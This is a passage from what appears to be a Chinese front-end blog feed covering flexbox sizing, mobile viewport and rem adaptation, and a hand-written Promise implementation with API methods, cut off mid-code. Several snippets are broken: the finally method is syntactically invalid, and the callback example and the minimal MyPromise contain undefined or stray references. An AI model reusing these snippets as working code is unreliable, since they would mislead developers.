值进行平分加大各个子元素上。</p><p><br></p><h4 id="3-4-flex-wrap、flex-shrink、flex-grow的关系"><a href="#3-4-flex-wrap、flex-shrink、flex-grow的关系" class="headerlink" title="3.4 flex-wrap、flex-shrink、flex-grow的关系"></a>3.4 flex-wrap、flex-shrink、flex-grow的关系</h4><p>容器的 flex-wrap 与子项的 flex-shrink、flex-grow 之间的关系</p><ol><li>当 flex-wrap 为 wrap | wrap-reverse，且子项宽度和不及父容器宽度时，flex-grow 会起作用，子项会根据 flex-grow 设定的值放大（为0的项不放大）</li><li>当 flex-wrap 为 wrap | wrap-reverse，且子项宽度和超过父容器宽度时，首先一定会换行，换行后，每一行的右端都可能会有剩余空间（最后一行包含的子项可能比前几行少，所以剩余空间可能会更大），这时 flex-grow 会起作用，若当前行所有子项的 flex-grow 都为0，则剩余空间保留，若当前行存在一个子项的 flex-grow 不为0，则剩余空间会被 flex-grow 不为0的子项占据</li><li>当 flex-wrap 为 nowrap，且子项宽度和不及父容器宽度时，flex-grow 会起作用，子项会根据 flex-grow 设定的值放大（为0的项不放大）</li><li>当 flex-wrap 为 nowrap，且子项宽度和超过父容器宽度时，flex-shrink 会起作用，子项会根据 flex-shrink 设定的值进行缩小（为0的项不缩小）。但这里有一个较为特殊情况，就是当这一行所有子项 flex-shrink 都为0时，也就是说所有的子项都不能缩小，就会出现讨厌的横向滚动条</li><li>总结上面四点，可以看出不管在什么情况下，在同一时间，flex-shrink 和 flex-grow 只有一个能起作用，这其中的道理细想起来也很浅显：空间足够时，flex-grow 就有发挥的余地，而空间不足时，flex-shrink 就能起作用。当然，flex-wrap 的值为 wrap | wrap-reverse 时，表明可以换行，既然可以换行，一般情况下空间就总是足够的，flex-shrink 当然就不会起作用</li></ol><p><br></p><h4 id="3-5-flex宽度计算"><a href="#3-5-flex宽度计算" class="headerlink" title="3.5 flex宽度计算"></a>3.5 flex宽度计算</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  * &#123;</span></span><br><span class="line"><span class="undefined">    padding: 0;</span></span><br><span class="line"><span class="undefined">    margin: 0;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="undefined">    width: 600px;</span></span><br><span class="line"><span class="undefined">    height: 300px;</span></span><br><span class="line"><span class="undefined">    display: flex;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.left</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 1 2 500px;</span></span><br><span class="line"><span class="undefined">    background: red;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="css">  <span class="selector-class">.right</span> &#123;</span></span><br><span class="line"><span class="undefined">    flex: 2 1 400px;</span></span><br><span class="line"><span class="undefined">    background: blue;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">子元素的 flex-shrink 的值分别为 2，1</span><br><span class="line">溢出：500+400 - 600 = 300。</span><br><span class="line">总权重为 2 * 500+ 1 * 400 = 1400</span><br><span class="line">两个元素分别收缩：</span><br><span class="line">300 * 2(flex-shrink) * 500(width) / 1400= 214.28</span><br><span class="line">300 * 1(flex-shrink) * 400(width) / 1400= 85.72</span><br><span class="line">三个元素的最终宽度分别为：</span><br><span class="line">500 - 214.28 = 285.72</span><br><span class="line">400 - 85.72 = 314.28</span><br></pre></td></tr></table></figure><p>收缩：子项宽度 - 移除宽度 <em> 子项收缩<strong>权重比例</strong>（自身宽度 </em> shrink / 总权重）<br>拉伸与收缩算法不一样：子项宽度 + 剩余宽度 * 子项拉伸比例</p><p><br></p><p><br></p><h3 id="5-移动端适配"><a href="#5-移动端适配" class="headerlink" title="5. 移动端适配"></a>5. 移动端适配</h3><h4 id="5-1-meta-viewport适配"><a href="#5-1-meta-viewport适配" class="headerlink" title="5.1 meta-viewport适配"></a>5.1 meta-viewport适配</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0, minimun-scale=1.0, maximum-scale=1.0, user-scalable=no"</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure><p>其中 device-width 意思是设备宽度</p><ul><li>width：属性控制视口的宽度，可以设置具体的宽度如：<code>width=700</code>，但是一般这么使用，都是使用 <code>width=device-width</code></li><li>inital-scale：页面初始缩放值，默认为 1；</li><li>maximum-scale：允许用户缩放到的最大比例。</li><li>minimum-scale：允许用户缩放到的最小比例。</li><li>user-scalable：用户是否可以手动缩放。</li></ul><p>为了能在移动设备上正常显示那些传统的为桌面浏览器设计的网站，移动设备上的浏览器都会把自己默认的viewport设为980px或1024px（也可能是其它值，这个是由设备自己决定的），这样做是因为许多页面没有做移动端优化，在小窗口渲染时会乱掉（或看起来乱）。所以，这种虚拟视口是一种让未做移动端优化的网站在窄屏设备上看起来更好的办法。</p><p><br></p><h4 id="5-2-媒体查询"><a href="#5-2-媒体查询" class="headerlink" title="5.2 媒体查询"></a>5.2 媒体查询</h4><p><em><code>@media</code></em>查询针对不同的屏幕尺寸设置不同的样式，当要设置响应式页面时，还是很有用的。当你重置浏览器大小的过程中，页面也会根据浏览器的宽度和高度重新渲染页面。</p><p><br></p><h4 id="5-3-em-rem-vw-vh"><a href="#5-3-em-rem-vw-vh" class="headerlink" title="5.3 em, rem, vw, vh"></a>5.3 em, rem, vw, vh</h4><p>em和rem都是相对单位长度</p><ul><li>em是相对父级font-size变化的，如果嵌套过深，计算会比较繁琐，因此一般大范围不适用，小范围可结合px单位使用。</li><li>rem是相对html根元素font-size变化的，没有em的繁琐计算，配合动态计算rem的js代码，rem在移动端布局中很受欢迎<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">win</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> doc = win.document;</span><br><span class="line"><span class="keyword">var</span> docEl = doc.documentElement;</span><br><span class="line"><span class="keyword">var</span> tid;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">refreshRem</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> width = docEl.getBoundingClientRect().width;        </span><br><span class="line"><span class="keyword">if</span> (width &gt;=<span class="number">750</span>) width = <span class="number">750</span>;</span><br><span class="line"><span class="keyword">if</span>(width&lt;=<span class="number">320</span>) width=<span class="number">320</span>;</span><br><span class="line"><span class="keyword">var</span> rem = width / <span class="number">7.5</span>;</span><br><span class="line">docEl.style.fontSize = rem + <span class="string">'px'</span>;</span><br><span class="line">&#125;</span><br><span class="line">win.addEventListener(<span class="string">'resize'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">clearTimeout(tid);</span><br><span class="line">tid = setTimeout(refreshRem, <span class="number">300</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">refreshRem();</span><br><span class="line">&#125;)(<span class="built_in">window</span>);</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://juejin.cn/post/6844903591149305864" target="_blank" rel="noopener">Flex 排版源码分析</a></li><li><a href="https://juejin.cn/post/6844903817503326216" target="_blank" rel="noopener">移动端三种适配方案</a></li></ul>]]></content>
      
      
    </entry>
    
    <entry>
      <title>异步的三种实现方式：回调、Promise、Async/Await</title>
      <link href="/2021/08/16/async-await/"/>
      <url>/2021/08/16/async-await/</url>
      <content type="html"><![CDATA[<h3 id="1-Promise"><a href="#1-Promise" class="headerlink" title="1. Promise"></a>1. Promise</h3><h4 id="1-1-Promise-解决了什么问题"><a href="#1-1-Promise-解决了什么问题" class="headerlink" title="1.1 Promise 解决了什么问题"></a>1.1 Promise 解决了什么问题</h4><p>为什么说Promise解决了地狱回调的问题？我们把地狱回调的代码改写成这样，这样的代码组织形式没有了层层嵌套的问题，咋一看，甚至还比Promise的要简洁。但它的每一处依然容易受到“回调地狱”的影响。为什么呢？<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 回调</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  then(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">then1</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">  then2(<span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">then2</span> (<span class="params"></span>) </span>&#123;&#125;<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Promise</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="number">1</span>)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    resolve(<span class="number">2</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> &#123; &#125;)</span><br></pre></td></tr></table></figure></p><p>为了将第2，3，4步链接在一起使他们相继发生，回调需要我们将第2 步硬编码在第1 步中，将第3 步硬编码在第2 步中，将第4 步硬编码在第3 步中，如此继续。</p><p><em>Promise解决了什么问题：</em></p><ul><li><p>提供一个标准化的异步管理流程<br>需要进行 io、等待或者其它异步操作的函数，不返回真实结果，而返回一个“承诺”。你只需要设置回调，等待承诺兑现，解决回调函数相互调用之间的标准（信任）问题。</p></li><li><p>链式调用取代回调嵌套，处理流程更线性<br>过多的回调会导致代码的逻辑不连贯、不线性，不符合直觉。Promise封装异步代码，可以让处理流程变得线性，只需要关注输入和输出。</p></li><li><p>指定回调函数更加灵活<br>promise之前：必须在启动异步任务前指定<br>promise：启动异步任务=&gt; 返回promise对象=&gt; 给promise 对象绑定回调函数（可以绑定多个，延时绑定）</p></li></ul><p><br></p><h4 id="1-1-Promise-实现原理"><a href="#1-1-Promise-实现原理" class="headerlink" title="1.1 Promise 实现原理"></a>1.1 Promise 实现原理</h4><p>Promise实际还是使用回调函数。它为每一个异步任务创建一个Promise实例，维护一个观察者模式。<strong>通过<code>.then</code>收集回调 -&gt; 异步触发resolve -&gt; resolve触发回调执行。</strong></p><ul><li><p>基本功能</p><ul><li>Promise接收一个<em><code>executor</code></em>，在<em><code>new Promsie</code></em>的时候立刻执行</li><li>异步任务被放入宏任务队列，等待执行</li><li><em><code>then()</code></em>被执行，收集回调放入成功/失败回调队列</li><li>异步任务执行成功调用<em><code>resolve</code></em>，执行失败调用<em><code>reject</code></em>，成功/失败回调队列执行<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个极简的Promise</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(executor) &#123;</span><br><span class="line">    <span class="keyword">this</span>._resolveQueue = []    <span class="comment">// then收集的执行成功的回调队列</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// resolve等待被异步任务执行，resolve执行时，取出回调一次执行</span></span><br><span class="line">    <span class="keyword">let</span> _resolve = <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(<span class="keyword">this</span>._resolveQueue.length) &#123;</span><br><span class="line">        <span class="keyword">const</span> callback = <span class="keyword">this</span>._resolveQueue.shift()</span><br><span class="line">        callback(val)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// new Promise()时立即执行executor</span></span><br><span class="line">    executor(_resolve, _reject)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// then方法,接收一个成功的回调和一个失败的回调，并push进队列</span></span><br><span class="line">  then(resolveFn, rejectFn) &#123;</span><br><span class="line">    <span class="keyword">this</span>._resolveQueue.push(resolveFn)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>链式调用</p><ul><li><code>then</code>负责收集成功回调 和 失败回调</li><li><code>then</code>返回的一定是一个新的Promise，保证每个promise都是独立的</li><li><code>then</code>的回调需要拿到上一个<code>then</code>的返回值</li><li>当<code>then</code>里是一个promise的时候，如何将这个promise的值传递给下一个then<br><img src="/2021/08/16/async-await/1.jpg"></li></ul></li><li><p>延迟机制</p><p>无论<code>resolve</code>是被同步执行，还是异步执行，都放在<code>setTimeout</code>中保证异步执行。保证回调函数可以延迟绑定</p></li><li><p>状态机</p><p>Promise状态只能有<code>Pending</code>, <code>Fulfilled</code>,<code>Rejected</code>，状态的变更是单向的，只能从Pending -&gt; Fulfilled, Pending -&gt; Rejected，状态变更不可逆</p></li></ul><p><br></p><h4 id="1-2-实现一个Promise"><a href="#1-2-实现一个Promise" class="headerlink" title="1.2 实现一个Promise"></a>1.2 实现一个Promise</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Promise/A+规定的三种状态</span></span><br><span class="line"><span class="keyword">const</span> PENDING = <span class="string">'pending'</span></span><br><span class="line"><span class="keyword">const</span> FULFILLED = <span class="string">'fulfilled'</span></span><br><span class="line"><span class="keyword">const</span> REJECTED = <span class="string">'rejected'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 构造方法接收一个回调</span></span><br><span class="line">  <span class="keyword">constructor</span>(executor) &#123;</span><br><span class="line">    <span class="keyword">this</span>._status = PENDING     <span class="comment">// Promise状态</span></span><br><span class="line">    <span class="keyword">this</span>._value = <span class="literal">undefined</span>    <span class="comment">// 储存then回调return的值</span></span><br><span class="line">    <span class="keyword">this</span>._resolveQueue = []    <span class="comment">// 成功队列, resolve时触发</span></span><br><span class="line">    <span class="keyword">this</span>._rejectQueue = []     <span class="comment">// 失败队列, reject时触发</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _resolve = <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> run = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>   <span class="comment">// 对应规范中的"状态只能由pending到fulfilled或rejected"</span></span><br><span class="line">        <span class="keyword">this</span>._status = FULFILLED              <span class="comment">// 变更状态</span></span><br><span class="line">        <span class="keyword">this</span>._value = val                     <span class="comment">// 储存当前value</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// then可以被同一个 promise 调用多次，因此使用一个队列来储存回调</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">this</span>._resolveQueue.length) &#123;    </span><br><span class="line">          <span class="keyword">const</span> callback = <span class="keyword">this</span>._resolveQueue.shift()</span><br><span class="line">          callback(val)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 无论resolve是被同步代码，还是异步代码，都放在setTimeout中保证延迟调用</span></span><br><span class="line">      setTimeout(run)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> _reject = <span class="function">(<span class="params">val</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> run = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>._status !== PENDING) <span class="keyword">return</span>   <span class="comment">// 对应规范中的"状态只能由pending到fulfilled或rejected"</span></span><br><span class="line">        <span class="keyword">this</span>._status = REJECTED               <span class="comment">// 变更状态</span></span><br><span class="line">        <span class="keyword">this</span>._value = val                     <span class="comment">// 储存当前value</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">this</span>._rejectQueue.length) &#123;</span><br><span class="line">          <span class="keyword">const</span> callback = <span class="keyword">this</span>._rejectQueue.shift()</span><br><span class="line">          callback(val)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      setTimeout(run)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// new Promise()时立即执行executor</span></span><br><span class="line">    executor(_resolve, _reject)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// then收集成功回调 和 失败回调</span></span><br><span class="line">  then(resolveFn, rejectFn) &#123;</span><br><span class="line">    <span class="comment">// 根据规范，如果then的参数不是function，则忽略它, 让链式调用继续往下执行</span></span><br><span class="line">    <span class="keyword">typeof</span> resolveFn !== <span class="string">'function'</span> ? resolveFn = <span class="function"><span class="params">value</span> =&gt;</span> value : <span class="literal">null</span></span><br><span class="line">    <span class="keyword">typeof</span> rejectFn !== <span class="string">'function'</span> ? rejectFn = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(reason <span class="keyword">instanceof</span> <span class="built_in">Error</span>? reason.message:reason);</span><br><span class="line">    &#125; : <span class="literal">null</span></span><br><span class="line">  </span><br><span class="line">    <span class="comment">// then总是返回一个新的promise</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> fulfilledFn = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> x = resolveFn(value)</span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">          之前一直不了解 为什么如果x是promise，就需要执行x.then()，苦想一段时间后有点体会：</span></span><br><span class="line"><span class="comment">  在这里只讨论 p1.then(() =&gt; &#123; return new Promise() &#125;).then() 的情况</span></span><br><span class="line"><span class="comment">  首先 第一个 .then() 内部默认会返回一个promise，叫做promiseA，开发者如果有需求则会手动return一个 新的 promise，叫做 promiseB，也就是上文的 x 。</span></span><br><span class="line"><span class="comment">  第二个.then()的回调函数参数实际上应该获取到的是开发者写的 promiseB(也就是x) 的执行结果，但是由于默认返回一个promiseA，则第二个.then()的回调函数参数是 promiseA 的执行结果.。 </span></span><br><span class="line"><span class="comment">  因此想要第二个.then()获取到的结果是正确的结果，就需要先执行 promiseB，再把 promiseB 的结果丢到promiseA。</span></span><br><span class="line"><span class="comment">  因此在得到 x 为 promise 的时候，先执行 x.then(resolve) ，这个形参 resolve 是 promiseA 的 resolve函数 ， 等到 x （promiseB） 的状态发生变化的时候，会执行then收集到的回调，即会执行 A 的 resolve 函数，而 x.then 的回调函数的参数就是 promiseA 的 resolve函数的参数。这样就把 x （promiseB）的执行结果通过.then回调传递到了 promiseA，然后通过 promiseA 的 resolve 函数传递到了第二个.then()。</span></span><br><span class="line"><span class="comment">  个人认为这个方法的巧妙之处在于 将 promiseA 的的 resolve 作为 x （promiseB）的then回调，而then回调的参数正是 x（promiseB）的执行结果，这样就把数据传递了起来。</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          x <span class="keyword">instanceof</span> MyPromise ? x.then(resolve, reject) : resolve(x)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          reject(error)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">const</span> rejectedFn  = <span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="keyword">let</span> x = rejectFn(error)</span><br><span class="line">          x <span class="keyword">instanceof</span> MyPromise ? x.then(resolve, reject) : resolve(x)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">          reject(error)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  </span><br><span class="line">      <span class="keyword">switch</span> (<span class="keyword">this</span>._status) &#123;</span><br><span class="line">        <span class="comment">// 当状态为pending时,把then回调push进resolve/reject执行队列,等待执行</span></span><br><span class="line">        <span class="keyword">case</span> PENDING:</span><br><span class="line">          <span class="keyword">this</span>._resolveQueue.push(fulfilledFn)</span><br><span class="line">          <span class="keyword">this</span>._rejectQueue.push(rejectedFn)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// 当状态已经变为resolve/reject时,直接执行then回调</span></span><br><span class="line">        <span class="keyword">case</span> FULFILLED:</span><br><span class="line">          fulfilledFn(<span class="keyword">this</span>._value)    <span class="comment">// this._value是上一个then回调return的值</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> REJECTED:</span><br><span class="line">          rejectedFn(<span class="keyword">this</span>._value)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-3-Promise-API"><a href="#1-3-Promise-API" class="headerlink" title="1.3 Promise API"></a>1.3 Promise API</h4><ul><li><p>Promise.prototype.catch()<br>设置Promise的失败回调</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (rejectFn) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.then(<span class="literal">undefined</span>, rejectFn)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.prototype.finally()<br>在promise结束时，无论结果是fulfilled或者是rejected，都会执行指定的回调函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">finally</span> (callback) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.then(</span><br><span class="line">    value =&gt; callback().then(())</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.resolve()<br>返回一个给定值resolve后的promise对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> resolve (value) &#123;</span><br><span class="line">  <span class="keyword">if</span> (value <span class="keyword">instanceof</span> MyPromise) <span class="keyword">return</span> value</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(value))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.reject()<br>返回一个带有拒绝原因的Promise对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> reject (reason) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> reject(reason))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Promise.all()<br>所有promise都完成(resolved)时</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> all (promiseArr) &#123;</span><br><span class="line">  <span class="keyword">let</span> index = <span 